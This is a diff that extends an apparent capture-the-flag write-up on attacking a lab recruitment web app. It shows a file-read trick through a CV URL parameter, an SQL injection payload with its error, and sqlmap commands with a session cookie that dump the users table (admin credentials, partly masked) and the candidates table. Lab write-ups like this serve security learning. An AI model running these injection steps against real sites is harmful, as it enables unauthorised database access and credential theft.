@@ -64,8 +64,67 @@ Recruitment Team
 ```
 We have recived the first part of the puzzle, the username! It say's the password is in config.php but after check I found out the page is blank. There must be another way to view it. After checking out other pages that I'm allowed to view I find a intresting snippet on the API page. ```You can fetch a candidate CV using the following endpoint:
 /file.php?cv=<URL>``` So with this infomation I assumed you can grab the contents of the config.php from the API. 
-```http://10.81.182.40/file.php?cv=file://config.php``` I was right, and I finally recievded the password for HR **hr########d123** After logging in we get the first flag!
+```http://10.81.182.40/file.php?cv=file://config.php``` I was right, and I finally recievded the password for HR **hr########d123** 
 
+After logging in we get the first flag and access to the dashboard.
+
+Now I am on the second part of the puzzle, getting the admin login!
+there's nothing intresting on this page besides a search bar. I tried some xss payloads which failed. then I tried some SQL payloads. 
+
+**PAYLOAD USED:** ' OR 1=1--
+
+```
+SQL Error:
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1
+```
+which gave me a error message, which indicates it's a sql vulenabilitie!
+
+I used sqlmap to dump the database to try and find some secrets!
+
+**SQLMAP :** sqlmap -u "http://10.81.182.40/dashboard.php?search" --cookie="PHPSESSID=44m0seitiqso7im6g91e3se9iq" --forms --crawl=2 -D database --dbs
+
+which gave me:
+```
+[12:04:12] [WARNING] reflective value(s) found and filtering out
+available databases [6]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+[*] recruit_db
+[*] sys
+```
+Perfect it works! time to dump some tables!
+
+**SQLMAP :** sqlmap -u "http://10.81.182.40/dashboard.php?search" --cookie="PHPSESSID=44m0seitiqso7im6g91e3se9iq" --forms --crawl=2 -D recruit_db --dump-all --dbs
+
+which gave me:
+```
+Database: recruit_db
+Table: users
+[1 entry]
++----+----------------+----------+
+| id | password       | username |
++----+----------------+----------+
+| 1  | admi#####admin | admin    |
++----+----------------+----------+
+
+[12:15:05] [INFO] table 'recruit_db.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.81.182.40/dump/recruit_db/users.csv'                                                            
+[12:15:05] [INFO] fetching columns for table 'candidates' in database 'recruit_db'
+[12:15:05] [INFO] fetching entries for table 'candidates' in database 'recruit_db'
+Database: recruit_db
+Table: candidates
+[4 entries]
++----+---------------+--------------+--------------------+
+| id | name          | status       | position           |
++----+---------------+--------------+--------------------+
+| 1  | Alice Johnson | Approved     | Frontend Developer |
+| 2  | Bob Smith     | Under Review | Backend Developer  |
+| 3  | Charlie Brown | Rejected     | Security Analyst   |
+| 4  | Diana Prince  | Selected     | HR Executive       |
++----+---------------+--------------+--------------------+
+```
+I got the admin login! After logging in with the admin details I got the final flag!
 
 
 
